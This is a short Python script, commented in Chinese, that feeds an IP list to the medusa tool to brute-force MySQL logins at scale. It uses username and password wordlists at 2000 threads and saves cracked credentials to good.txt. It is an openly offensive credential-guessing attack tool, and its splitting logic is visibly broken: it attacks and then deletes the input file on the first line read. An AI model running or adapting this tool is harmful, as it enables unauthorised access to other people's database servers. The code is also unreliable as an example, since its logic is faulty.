#!/usr/bin/env python
#coding:utf-8
import os
import subprocess

def Segmentation(): #分割txt

    try:
        with open("ips.txt",'r') as file:
            i=0
            j=0
            for ips in file:
                if i>=5000:
                    f=open("iplist"+str(j)+".txt",'a+')
                    f.write(ips)
                    i+=1
                else:
                    Blast("ips"+".txt")
                    i=0
                    j+=1
    except IOError:
        print("Check if ips.txt exists !")

def Blast(fileNames):#爆破

    subprocess.call("medusa -H "+fileNames+" -U user.txt -P pass.txt -M mysql -T 2000 -O good.txt", shell=True)
    os.remove(fileNames)
    print(u"Blasting has been completed")

def run():

    print(""" QQ228393654 """)

    Segmentation()

if __name__ == '__main__':
    run()
